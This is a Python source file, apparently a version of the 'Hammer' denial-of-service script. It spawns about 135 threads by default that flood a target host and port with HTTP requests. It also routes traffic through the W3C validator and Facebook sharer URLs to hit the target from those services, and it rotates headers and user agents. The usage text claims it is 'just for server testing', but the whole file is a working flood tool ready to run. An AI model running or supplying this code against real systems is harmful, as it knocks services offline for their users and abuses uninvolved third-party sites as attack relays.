from queue import Queue
from optparse import OptionParser
import time
import sys
import socket
import threading
import logging
import urllib.request
import random

def load_headers(file_path):
    """Load headers from a file and split them into a list."""
    with open(file_path, 'r') as file:
        content = file.read().strip()
        headers_list = content.split('\n\n')  # Adjust delimiter if needed
    return headers_list

def get_random_header(headers_list):
    """Return a random header from the list."""
    return random.choice(headers_list)

def user_agent():
    """Return a list of user agents."""
    return [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
    ]

def my_bots():
    """Return a list of bot URLs."""
    return [
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u="
    ]

def bot_hammering(url, headers_list):
    """Hammer a URL using various headers."""
    while True:
        try:
            header = get_random_header(headers_list)
            req = urllib.request.Request(url, headers={'User-Agent': random.choice(user_agent())})
            urllib.request.urlopen(req)
            print("\033[94mbot is hammering...\033[0m")
            time.sleep(0.1)
        except:
            time.sleep(0.1)

def down_it(item, host, port, headers_list):
    """Send a packet to the target host and port."""
    try:
        while True:
            header = get_random_header(headers_list)
            packet = str(f"GET / HTTP/1.1\nHost: {host}\n\n{header}").encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print(f"\033[92m{time.ctime(time.time())}\033[0m \033[94m <--packet sent! hammering--> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(0.1)
    except socket.error as e:
        print("\033[91mno connection! server maybe down\033[0m")
        time.sleep(0.1)

def dos(q, host, port, headers_list):
    """Worker thread for sending packets."""
    while True:
        item = q.get()
        down_it(item, host, port, headers_list)
        q.task_done()

def dos2(w, bots):
    """Worker thread for bot hammering."""
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host, headers_list)
        w.task_done()

def usage():
    """Print usage information."""
    print('''\033[92mHammer Dos Script
It is the end user's responsibility to obey all applicable laws.
It is just for server testing script. Your IP is visible.\n
usage: python3 hammer.py [-s] [-p] [-t]
-h : help
-s : server IP
-p : port (default 80)
-t : turbo (default 135)\033[0m''')
    sys.exit()

def get_parameters():
    """Parse command-line parameters."""
    global host
    global port
    global thr
    global item
    global headers_list

    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="attack to server IP -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')

    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo

    # Load headers from file
    headers_list = load_headers('headers.txt')

# Initialize global variables
headers_list = []
q = Queue()
w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print(f"\033[92m{host} port: {str(port)} turbo: {str(thr)}\033[0m")
    print("\033[94mPlease wait...\033[0m")
    
    user_agent()
    bots = my_bots()
    time.sleep(5)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91mcheck server IP and port\033[0m")
        usage()
    
    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos, args=(q, host, port, headers_list))
            t.daemon = True  # if thread is exist, it dies
            t.start()
            t2 = threading.Thread(target=dos2, args=(w, bots))
            t2.daemon = True  # if thread is exist, it dies
            t2.start()
        start = time.time()
        # Tasking
        item = 0
        while True:
            if item > 1800:  # to avoid memory crash
                item = 0
                time.sleep(0.1)
            item += 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()